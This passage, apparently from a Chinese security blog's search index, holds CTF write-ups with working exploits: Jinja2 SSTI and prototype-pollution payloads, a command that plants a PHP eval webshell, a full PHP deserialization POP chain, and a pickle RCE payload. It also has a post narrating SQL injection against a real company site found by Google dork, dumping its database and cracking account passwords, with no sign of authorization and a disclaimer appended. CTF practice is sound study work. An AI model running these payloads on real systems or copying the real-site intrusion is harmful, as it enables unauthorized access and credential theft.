and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) @app.route(\u0026#39;/magic\u0026#39;,methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def pollute(): if request.method == \u0026#39;POST\u0026#39;: if request.is_json: merge(json.loads(request.data), instance) return \u0026#34;这个魔术还行吧\u0026#34; else: return \u0026#34;我要json的魔术\u0026#34; return \u0026#34;记得用POST方法把魔术交上来\u0026#34; 代码里面有merge函数，基本存在python原型链污染了，结合开头ban了左右花括号，我们可以尝试利用原型链污染来修改jinja2模版的属性，直接将变量取值方式改为\u0026laquo;\u0026raquo;从而绕过花括号的过滤\n将以下json数据传入经json.loads后成功修改\n1 2 3 4 5 6 7 8 9 10 11 12 { \u0026#34;__init__\u0026#34;: { \u0026#34;__globals__\u0026#34;: { \u0026#34;app\u0026#34;: { \u0026#34;jinja_env\u0026#34;: { \u0026#34;variable_start_string\u0026#34;: \u0026#34;\u0026lt;\u0026lt;\u0026#34;, \u0026#34;variable_end_string\u0026#34;: \u0026#34;\u0026gt;\u0026gt;\u0026#34; } } } } } 回到index目录下进行常规ssti即可\n这里我尝试了几个模块，其实方法都差不多，不过subprocess.Popen这个类本身就能够执行命令\nwarnings.catch_warnings 1 \u0026lt;\u0026lt;\u0026#39;\u0026#39;.__class__.__mro__[1].__subclasses__()[222].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;id\u0026#39;).read()\u0026#34;)\u0026gt;\u0026gt; subprocess.Popen 1 \u0026lt;\u0026lt;[].__class__.__mro__[1].__subclasses__()[351](\u0026#39;cat /flag\u0026#39;,shell=True,stdout=-1).communicate()[0].strip()\u0026gt;\u0026gt; os._wrap_close 1 \u0026lt;\u0026lt;[].__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[\u0026#39;popen\u0026#39;](\u0026#39;id\u0026#39;).read()\u0026gt;\u0026gt; [Fin] Just Readme (前置) 使用这个项目打glibc的iconv()函数将文件读取变成rce\n将data后改为.text,不然无法正常输出\npayloadpython3 cnext-exploit.py http://challenge.basectf.fun:34357/ \u0026quot;echo '\u0026lt;?=@eval(\\$_POST[0]);?\u0026gt;' \u0026gt; shell.php\u0026quot;\n蚁剑连接执行文件即可\n[Fin] Lucky Number 源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 from flask import Flask,request,render_template_string,render_template from jinja2 import Template import json import heaven def merge(src, dst): for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) class cls(): def __init__(self): pass instance = cls() BLACKLIST_IN_index = [\u0026#39;{\u0026#39;,\u0026#39;}\u0026#39;] def is_json(data): try: json.loads(data) return True except ValueError: return False @app.route(\u0026#39;/m4G1c\u0026#39;,methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def pollute(): if request.method == \u0026#39;POST\u0026#39;: if request.is_json: merge(json.loads(request.data), instance) result = heaven.create() message = result[\u0026#34;message\u0026#34;] return \u0026#34;这个魔术还行吧 \u0026#34; + message else: return \u0026#34;我要json的魔术\u0026#34; return \u0026#34;记得用POST方法把魔术交上来\u0026#34; #heaven.py def create(kon=\u0026#34;Kon\u0026#34;, pure=\u0026#34;Pure\u0026#34;, *, confirm=False): if confirm and \u0026#34;lucky_number\u0026#34; not in create.__kwdefaults__: return {\u0026#34;message\u0026#34;: \u0026#34;嗯嗯，我已经知道你要创造东西了，但是你怎么不告诉我要创造什么？\u0026#34;, \u0026#34;lucky_number\u0026#34;: \u0026#34;nope\u0026#34;} if confirm and \u0026#34;lucky_number\u0026#34; in create.__kwdefaults__: return {\u0026#34;message\u0026#34;: \u0026#34;这是你的lucky_number，请拿好，去/check下检查一下吧\u0026#34;, \u0026#34;lucky_number\u0026#34;: create.__kwdefaults__[\u0026#34;lucky_number\u0026#34;]} return {\u0026#34;message\u0026#34;: \u0026#34;你有什么想创造的吗？\u0026#34;, \u0026#34;lucky_number\u0026#34;: \u0026#34;nope\u0026#34;} 解题重点是这两个属性\n怎么导入sys模块呢，看了官方wp才知道在python中存在着**spec内置属性，包含了关于类加载时的信息，定义在Lib/importlib/_bootstrap.py的类ModuleSpec，所以可以直接采用\u0026lt;模块名\u0026gt;.spec.init.globals[\u0026lsquo;sys\u0026rsquo;]**获取到sys模块，此处导入了json模块就可以使用json模块获取\npayload,拿去json格式化一下即可\n1 {\u0026#34;__init__\u0026#34;:{\u0026#34;__globals__\u0026#34;:{\u0026#34;json\u0026#34;:{\u0026#34;__sepc__\u0026#34;:{\u0026#34;__init__\u0026#34;:{\u0026#34;__globals__\u0026#34;:{\u0026#34;sys\u0026#34;:{\u0026#34;modules\u0026#34;:{\u0026#34;heaven\u0026#34;:{\u0026#34;create\u0026#34;:{\u0026#34;__kwdefaults__\u0026#34;:{\u0026#34;confirm\u0026#34;:\u0026#34;true\u0026#34;,\u0026#34;lucky_number\u0026#34;:\u0026#34;5346\u0026#34;}}}}}}}}}}}} 传参后提示去/check检查一下\n检查成功了，去对应目录ssti\n这里利用os._wrap_close中的popen方法直接执行命令即可，模块方法有很多\n[Fin] ez_php 这道题出现了很多新知识，比如引用绕过，php GC回收攻击，mb_substr,mb_strpos字符串逃逸，理解清楚后算是收益颇丰，参考文章：\n()[ctfshow_XGCTF_西瓜杯 | 晨曦的个人小站 (chenxi9981.github.io)]\n()[(ฅ\u0026gt;ω\u0026lt;*ฅ) 噫又好啦 ~php反序列化 | 晨曦的个人小站 (chenxi9981.github.io)]\n源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 \u0026lt;?php highlight_file(__file__); function substrstr($data) { $start = mb_strpos($data, \u0026#34;[\u0026#34;); $end = mb_strpos($data, \u0026#34;]\u0026#34;); return mb_substr($data, $start + 1, $end - 1 - $start); } class Hacker{ public $start; public $end; public $username=\u0026#34;hacker\u0026#34;; public function __construct($start){ $this-\u0026gt;start=$start; } public function __wakeup(){ $this-\u0026gt;username=\u0026#34;hacker\u0026#34;; $this-\u0026gt;end = $this-\u0026gt;start; } public function __destruct(){ if(!preg_match(\u0026#39;/ctfer/i\u0026#39;,$this-\u0026gt;username)){ echo \u0026#39;Hacker！\u0026#39;; } } } class C{ public $c; public function __toString(){ $this-\u0026gt;c-\u0026gt;c(); return \u0026#34;C\u0026#34;; } } class T{ public $t; public function __call($name,$args){ echo $this-\u0026gt;t-\u0026gt;t; } } class F{ public $f; public function __get($name){ return isset($this-\u0026gt;f-\u0026gt;f); } } class E{ public $e; public function __isset($name){ ($this-\u0026gt;e)(); } } class R{ public $r; public function __invoke(){ eval($this-\u0026gt;r); } } if(isset($_GET[\u0026#39;ez_ser.from_you\u0026#39;])){ $ctf = new Hacker(\u0026#39;{{{\u0026#39;.$_GET[\u0026#39;ez_ser.from_you\u0026#39;].\u0026#39;}}}\u0026#39;); if(preg_match(\u0026#34;/\\[|\\]/i\u0026#34;, $_GET[\u0026#39;substr\u0026#39;])){ die(\u0026#34;NONONO!!!\u0026#34;); } $pre = isset($_GET[\u0026#39;substr\u0026#39;])?$_GET[\u0026#39;substr\u0026#39;]:\u0026#34;substr\u0026#34;; $ser_ctf = substrstr($pre.\u0026#34;[\u0026#34;.serialize($ctf).\u0026#34;]\u0026#34;); $a = unserialize($ser_ctf); throw new Exception(\u0026#34;杂鱼~杂鱼~\u0026#34;); } 首先便是构造pop利用链，这道题的是比较好构造的，有个以前不知道的知识点是__get方法中 如果你没有为 t 属性赋值，或者将其设置为 null，那么在调用 $this-\u0026gt;t-\u0026gt;t 时将会抛出一个错误，因为你尝试在一个 null 值上访问属性\n以前只知道访问不可访问属性和未定义成员变量可以触发，其实没赋值定义访问属性也能触发\n到Hacker类前这么构造即可\n1 2 3 4 5 6 7 8 9 10 $s1 = new R(); $s1-\u0026gt;r = \u0026#34;system(\u0026#39;cat /flag\u0026#39;);\u0026#34;; $s2 = new E(); $s2-\u0026gt;e = $s1; $s3 = new F(); $s3-\u0026gt;f = $s2; $s4 = new T(); $s4-\u0026gt;t = $s3; $s5 = new C(); $s5-\u0026gt;c = $s4; 然后Hacker类中绕过__wakeup方法，因为下面还有个赋值操作$this-\u0026gt;end = $this-\u0026gt;start，我们可以引用赋值来绕过\n1 2 $s6-\u0026gt;end = \u0026amp;$s6-\u0026gt;username; $s6-\u0026gt;start = $s5; 到这利用链已经基本构造完了，注意源码中还有句throw new Exception(\u0026quot;杂鱼~杂鱼~\u0026quot;);抛出异常会导致__destruct析构方法无法执行从而导致反序列化过程失败\n绕过抛出异常就需要利用到PHP的GC垃圾回收机制，我举个例：本地开个php服务器执行以下代码进行测试\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php highlight_file(__FILE__); $flag = \u0026#34;flag{test_flag}\u0026#34;; class B { function __destruct() { global $flag; echo $flag; } } $a = unserialize($_GET[\u0026#39;ctf\u0026#39;]); throw new Exception(\u0026#39;nonono\u0026#39;); 构造一个payload\n传入后发现提前执行了析构方法echo $flag,利用成功\n生成payload后别忘了手动将键名2改为1，不能直接写两个1，这样会导致value直接变为null\n1 $s7 = array(\u0026#39;1\u0026#39;=\u0026gt;$s6,\u0026#39;2\u0026#39;=\u0026gt;null); 最后就是substrstr函数，看似返回中括号内容和下文一致没什么错误\n1 2 3 4 5 6 7 8 function substrstr($data) { $start = mb_strpos($data, \u0026#34;[\u0026#34;); $end = mb_strpos($data, \u0026#34;]\u0026#34;); return mb_substr($data, $start + 1, $end - 1 - $start); } --------------- --- $ser_ctf = substrstr($pre.\u0026#34;[\u0026#34;.serialize($ctf).\u0026#34;]\u0026#34;); 实际上生成的数据没有中括号而且前面还有三十八位无效数据影响反序列化\n本地尝试发现序列化数据被截取后是无法执行的\n关于mb_strpos和mb_substr的知识，\n1 2 3 4 5 6 每发送一个%f0abc，mb_strpos认为是4个字节，mb_substr认为是1个字节，相差3个字节 每发送一个%f0%9fab,mb_strpos认为是3个字节，mb_substr认为是1个字节，相差2个字节 每发送一个%f0%9f%9fa,mb_strpos认为是2个字节，mb_substr认为是1个字节，相差1个字节 unicode占4字节，mb_substr会将数据%f0abc中的ab拿去补全四字节，从而认为该数据只有c的一个字节 %f0%9fab这种则会保留最少一位b，所以又认为只有一字节 根据原先构造链输出我们需要的数据是不需要前面这38位的，可以利用以上知识利用字符串逃逸来截取掉这38位数据只留我们的payload\n最终exp，别忘了将生成数据键名改为1！\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 $a = \u0026#34;%f0abc\u0026#34;; error_reporting(0); function substrstr($data)//提权中括号之间的内容 { $start = mb_strpos($data, \u0026#34;[\u0026#34;); $end = mb_strpos($data, \u0026#34;]\u0026#34;); return mb_substr($data, $start + 1, $end - 1 - $start); } class Hacker { public $start; public $end; public $username = \u0026#34;ctfer\u0026#34;; public function __wakeup() { $this-\u0026gt;username = \u0026#34;hacker\u0026#34;; $this-\u0026gt;end = $this-\u0026gt;start; } public function __destruct() { if (!preg_match(\u0026#39;/ctfer/i\u0026#39;, $this-\u0026gt;username)) { echo \u0026#39;Hacker！\u0026#39;; } } } class C { public $c; public function __toString() { $this-\u0026gt;c-\u0026gt;c(); return \u0026#34;C\u0026#34;; } } class T { public $t; public function __call($name, $args) { echo $this-\u0026gt;t-\u0026gt;t; } } class F { public $f; public function __get($name) { return isset($this-\u0026gt;f-\u0026gt;f); } } class E { public $e; public function __isset($name) { ($this-\u0026gt;e)(); } } class R { public $r; public function __invoke() { eval($this-\u0026gt;r); } } $s1 = new R(); $s1-\u0026gt;r = \u0026#34;system(\u0026#39;cat /flag\u0026#39;);\u0026#34;; $s2 = new E(); $s2-\u0026gt;e = $s1; $s3 = new F(); $s3-\u0026gt;f = $s2; $s4 = new T(); $s4-\u0026gt;t = $s3; $s5 = new C(); $s5-\u0026gt;c = $s4; $s6 = new Hacker(); $s6-\u0026gt;end = \u0026amp;$s6-\u0026gt;username; $s6-\u0026gt;start = $s5; $s7 = array(\u0026#39;1\u0026#39;=\u0026gt;$s6,\u0026#39;2\u0026#39;=\u0026gt;null); //echo serialize($s7).\u0026#34;\\n\u0026#34;; //echo urlencode(serialize($s7)).\u0026#34;\\n\u0026#34;; echo \u0026#34;?substr=\u0026#34;.str_repeat($a,12).\u0026#34;%f0%9fab\u0026amp;ez[ser.from_you=\u0026#34;.urlencode(serialize($s7)).\u0026#34;\\n\u0026#34;; payload\n1 %f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%9fab\u0026amp;ez[ser.from_you=a%3A2%3A%7Bi%3A1%3BO%3A6%3A%22Hacker%22%3A3%3A%7Bs%3A5%3A%22start%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A1%3A%22c%22%3BO%3A1%3A%22T%22%3A1%3A%7Bs%3A1%3A%22t%22%3BO%3A1%3A%22F%22%3A1%3A%7Bs%3A1%3A%22f%22%3BO%3A1%3A%22E%22%3A1%3A%7Bs%3A1%3A%22e%22%3BO%3A1%3A%22R%22%3A1%3A%7Bs%3A1%3A%22r%22%3Bs%3A20%3A%22system%28%27cat+%2Fflag%27%29%3B%22%3B%7D%7D%7D%7D%7Ds%3A3%3A%22end%22%3Bs%3A5%3A%22ctfer%22%3Bs%3A8%3A%22username%22%3BR%3A9%3B%7Di%3A1%3BN%3B%7D solved!\n","date":"2024-09-12T17:26:54+08:00","permalink":"http://gucheng.me/p/basectf%E6%8B%9B%E6%96%B0%E8%B5%9B-web-wp/","title":"BaseCTF招新赛 Web Wp"},{"content":"发现方式 利用goole语法inurl=\u0026quot;id=\u0026quot;发现某公司php站点，在id后输入1' and 'a'='a'--显示被waf拦截\n这个waf我去搜了一下是西数的一个waf，挺拉的\n经过尝试发现是空格被过滤了，于是将空格用+替换。输入1'+and+'a'='a'--后页面报错，说明存在sql注入漏洞\n基本信息 1 2 3 4 5 ?id=1+union+select+database()-- ?id=1+union+select+version()-- ?id=1+union+select+user()-- 成功查询到当前库名：sanying mysql版本：5.7.43 user：sanying@127.0.0.1 这个版本是好多年前的了，高版本的用法不能在这用\n查库 在构造的时候又发现这个waf规则里面group_concat不能和括号连用，所以我们只能用limit一条一条查\n构造payload\n?id=-1+union+select+schema_name+from+information_schema.schemata+limit+0,1--\n发现只有两个库，其中一个还是系统库(°ー°〃)\n看来只用脱sanying库就行了，系统库就不管了\n查表 构造payload\n?id=-1+union+select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1--\n后面可以用用burp的攻击模块或者自己写个脚本提取，我选的后者。因为前者还要自己去把表名抄下来太麻烦，我根据页面回显利用python re库和正则将回显内容提取出来即可，最后发现有共17张表\n查列名 查列名的时候又发现不能指定数据库或者具体的表名来查，反正我们只脱一个库数据库名就可以一直用database(),表名就用子查询+limit n,1来指定，后续把n当作循环变量即可\n构造payload\n?id=-1+union+select+column_name+from+information_schema.columns+where+table_name=(select+table_name+from+information_schema.tables+where+table_schema=database()+limit+n,1)+and+table_schema=database()+limit+0,1--\n然后写入脚本自动化查询每张表的列名\n查数据 到这里了开始我是想尽办法构造出列名，结果最后发现可以直接指定列名来查，不知道为什么，这个waf给我人整麻了 ╮(╯▽╰)╭\n构造payload\n-1+union+select+{data[i]}+from+Sanying.{km}\n这里是从脚本里面复制出来的，我是先把列名处理成列表\n这里因为不太会协调这些数据的位置处理输出到xlsx，有些列还是空的，所以我只能半自动化手动填数据到excel，有大佬的话浇浇我！\n成果 最后就是这样，拿到了两个账号和一些信息，这库也是真的老了，十几年前的了，密码还是用的md5，但是最近又有人登录。后面利用hashcat和在线网站成功解出两个md5哈希，也算是稍有收获！\n免责声明： 目的：本文旨在分享有关网络安全渗透知识的信息，以促进对网络安全的理解和提高个人和组织的安全意识。这些知识和技术应仅用于合法的、授权的安全测试和红队操作，并遵守适用的法律和道德规范。\n法律合规：在参考本文所提供的渗透测试和攻击技术时，请确保遵守您所在国家或地区的法律法规。未经合法授权和明确许可，禁止使用这些知识和技术从事非法活动，如未经授权的入侵、数据盗取、破坏性攻击等。\n责任限制：使用本文所提供的信息和技术的过程中，如因操作不当或其他原因导致任何损失或损害，作者概不负责。使用者应自行承担所有风险和后果。\n免责声明：本文的分享仅为技术交流和学习之用，并不鼓励任何非法活动。作者不对任何个人或组织的非法行为承担任何责任。\n出事与作者无关：使用者在运用本文提供的知识和技术时，应自行判断和承担责任。如因使用者违反法律法规或滥用本文提供的知识和技术而导致任何问题、损失或法律责任，与作者无关。使用者应对其行为负完全责任。\n合法授权：在进行安全测试和渗透测试时，使用者应首先获得相关系统和网络的合法授权，确保测试的对象是属于您合法所有或得到明确授权的。\n持续学习：网络安全是一个不断发展和演变的领域，本文提供的知识和技术可能随时间而过时或失效。使用者应不断学习和更新知识，关注最新的安全趋势、漏洞和防护措施。\n通过阅读和使用本文提供的信息和技术，视为您理解并同意以上免责声明，并同意自行承担使用这些知识和技术所产生的风险和后果。作者对任何不当使用所导致的问题、损失或法律责任概不负责。\n","date":"2024-09-11T11:34:30+08:00","permalink":"http://gucheng.me/p/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%9C%9F%E5%AE%9E%E7%AB%99%E7%82%B9sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","title":"记一次真实站点sql注入漏洞"},{"content":" [!NOTE]\n这里我就只写一些有价值点的和我当时不会的题目的wp了\n[Week1] 捂住X只耳 下载音频后未发现频谱和音频波异常，听了下在音乐后半段有摩斯电码声音，所以我们需要将摩斯电码从音乐中分离出来以便识别\n先点击三个点分离立体声到单音道 点击左上角文件-\u0026gt;导出音频-\u0026gt;多个文件-\u0026gt;导出 成功导出两个wav\n打开Adobe Audition，左上角依次点击文件——新建——多轨会话——确定\n将刚才生成的两个wav拖入进多轨会话，然后双击未命名混音项目，再将两个wav拖入右边轨道\n双击一个轨道进入后上面工具栏点击——效果——反相 双击左侧未命名混音项目后点击左上角，选择导出，多轨混音，整个会话，选择导出位置后直接导出 将生成的mp3拖入audacity，点击三个点，频谱图。然后按住ctrl滑动滚轮放大可以看到明显的摩斯码，抄下来解密即可 [Week2] Base?! 这是一段xx-encode码，开始真没想到，随波逐流一把嗦即可\n[Week3] Base revenge 将以上文本base64隐写解密得到JnUaAFMFImgANSEuAWYuBE9SyaYpC2ldBrU9\n将hint一键解码发现是atbash加密\n因为编码器解出来大小写有问题直接用[cyberchef](Atbash Cipher - CyberChef)\n再base64解码即可\n[Week3] broken.mp4 这道题挺简单的，两个视频用untrunc工具修复即可\n[Week3] 外星信号 音频播放就有莫斯码，先丢[在线网站](Morse Code Adaptive Audio Decoder | Morse Code World)听一下,前半部分flag在这里面，要转换小写\n音频使用foremost提取出压缩包里面有另一个音频，一听就知道是sstv，sstv我只推荐使用[这个脚本](colaclanth/sstv: SSTV Decoder (github.com))，软件又拉又麻烦,下面是用法\n1 sstv -d flag.mp3 -o result.png 提取出摩斯码图片如下\n和前面半段flag组合转换小写即可\n[Week3] 这是一个压缩包 这道题利用archpr工具的掩码破解，花了我n小时，感觉脚本会更快\n[Week4] Webshell 这道题先用wireshark提取出rar压缩包，解压发现是一套WordPress程序，这种博客没啥上传点吧，ai回答\nWordPress作为一款广泛使用的内容管理系统（CMS），其安全性一直备受关注。关于WordPress中容易被上传webshell的文件路径，可以从以下几个方面进行归纳： 主题文件夹： 路径示例：/wp-content/themes/[主题名称]/ 说明：WordPress允许用户通过后台上传和安装主题。黑客可能会将恶意代码（如webshell）嵌入到自定义主题中，并通过上传主题的方式将其部署到目标网站上。一旦主题被安装，webshell就可以被用来执行恶意命令或操纵网站。 插件文件夹：\n虽然问题中主要询问的是关于webshell上传的文件路径，但值得注意的是，插件文件夹也是潜在的安全风险点。 路径示例：/wp-content/plugins/[插件名称]/ 说明：与主题类似，插件也是WordPress扩展功能的重要方式。黑客可能会利用漏洞或恶意插件来上传webshell，从而控制网站。 上传文件夹：\n路径示例：/wp-content/uploads/ 说明：这是WordPress默认的媒体文件上传目录。虽然直接在这个文件夹中上传webshell可能受到WordPress的限制，但黑客可能会通过绕过安全检查或将webshell与合法文件捆绑上传的方式来达到目的。 自定义上传目录：\n路径示例：根据用户设置而定（如/wp-content/uploads/custom-directory/） 说明：WordPress允许用户通过修改配置或安装特定插件来更改默认的上传目录。如果这些自定义目录的安全设置不当，就可能成为黑客上传webshell的潜在目标。\n然后再插件目录下确实发现了\n转字符串后发现读取ui.js文件的内容\n目录下搜索ui.js，解码后发现很像@eval($_POST[\u0026rsquo;\u0026rsquo;])这种，但是传webshell的都使用了自定义函数和各种函数加编码，还是相当有水平的\n连接密码提交不对？再回去一看原来还有层rot13，解密提交即可\n[Week4] 二维码2-阿喀琉斯之踵 这道题用CQR纠错是不行的，里面二维码被添加了东西格式不对，用这个[项目](QRazyBox - QR Code Analysis and Recovery Toolkit (merri.cx))可以尝试爆破所有格式\n从图片导入qrcode-2.png 点击右上角tools 先选择爆破格式模式，然后再点击最上面提取信息 over\n[Week4] 小cheny的社交 这道题，嗯\u0026hellip;会了后有点没啥讲的了，我大体说下过程\nstegsolve看到一串字符，base64解码后再转16进制ascii得到一个QQ\n搜索QQ在她空间发现尊嘟假嘟编码，用[](尊嘟假嘟O.o (zdjd.asia))解码得到前半flag，然后还有个视频到b站搜评论下@了一个人点进去看到另外一串密文\n看着很像链接，用随波逐流梭哈搜索https发现链接\n进入链接博客又发现尊嘟假嘟编码，这里解码得到后半flag[](尊嘟假嘟O.o (zdjd.asia))\nPickle Init [Week3] [Week4] 学习文章，我也不会opcode\nPickle反序列化 - 枫のBlog (goodapple.top)\n题目源码\n1 2 3 #!/bin/bash echo \u0026#34;${GZCTF_FLAG}\u0026#34; \u0026gt; /flag python3 -c \u0026#34;__import__(\u0026#39;pickle\u0026#39;).loads(__import__(\u0026#39;sys\u0026#39;).stdin.read(50).encode(\u0026#39;ASCII\u0026#39;))\u0026#34; 贴个脚本，用pwntools发的，不然不好填50字节\n1 2 3 4 5 6 7 8 9 10 11 r1 = b\u0026#34;\u0026#34;\u0026#34;cos system (S\u0026#39;cat flag\u0026#39; tR.\u0026#34;\u0026#34;\u0026#34; from pwn import * s = remote(\u0026#39;challenge.basectf.fun\u0026#39;,41751) payload = r1.ljust(50,b\u0026#39;0\u0026#39;)\t#从左边填充0 s.sendline(payload) s.interactive() ","date":"2024-09-10T15:25:42+08:00","permalink":"http://gucheng.me/p/basectf%E6%8B%9B%E6%96%B0%E8%B5%9B-misc-wp/","title":"BaseCTF招新赛-Misc-wp"}]